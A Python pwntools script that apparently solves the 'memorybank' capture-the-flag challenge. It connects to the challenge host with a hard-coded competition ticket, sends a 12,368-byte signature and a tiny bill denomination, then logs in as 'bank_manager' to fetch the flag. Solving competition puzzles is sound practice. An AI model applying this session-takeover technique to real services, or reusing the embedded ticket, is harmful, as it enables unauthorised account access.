import os

os.environ["TERM"] = "xterm-256color"
from pwn import *
from tqdm import tqdm

server1 = remote(host="memorybank-tlc4zml47uyjm.shellweplayaga.me", port=9005)
server1.recvuntil(b"Ticket please: ")
server1.send(
    b"ticket{NapoleonClemens9344n25:sJUUv01wqHP6urdBkXFRGLma_ZawJ9ThzJa3H7pYi-x5naUe}\n"
)
print("Registering...")
server1.recvuntil(b"Please register with a username (or type 'exit' to quit): ")
server1.send(b"random\n")
print("Setting signature...")
server1.send(b"3\n")
server1.recvuntil(b"Enter your signature (will be used on bills): ")
server1.send(b"a" * 12368 + b"\n")
server1.recvuntil(b"Your signature has been updated")
server1.recvuntil(b"Choose an operation (1-5): ")
print("Add bills...")
server1.send(b"2\n")
server1.recvuntil(b"Enter amount to withdraw: ")
server1.send(b"101\n")
server1.recvuntil(b"Enter bill denomination: ")
server1.send(b"0.002\n")
server1.recvuntil(b"Choose an operation (1-5): ")
print("Log-out...")
server1.send(b"4\n")
server1.recvuntil(b"Please register with a username (or type 'exit' to quit): ")
print("Login as bank_manager...")
server1.send(b"bank_manager\n")
server1.recvuntil(b"Choose an operation (1-6): ")
print("Request flag...")
server1.send(b"6\n")
print(server1.recvuntil(b"Flag contents:").decode())
print(server1.recvline().decode())
print(server1.recvline().decode())
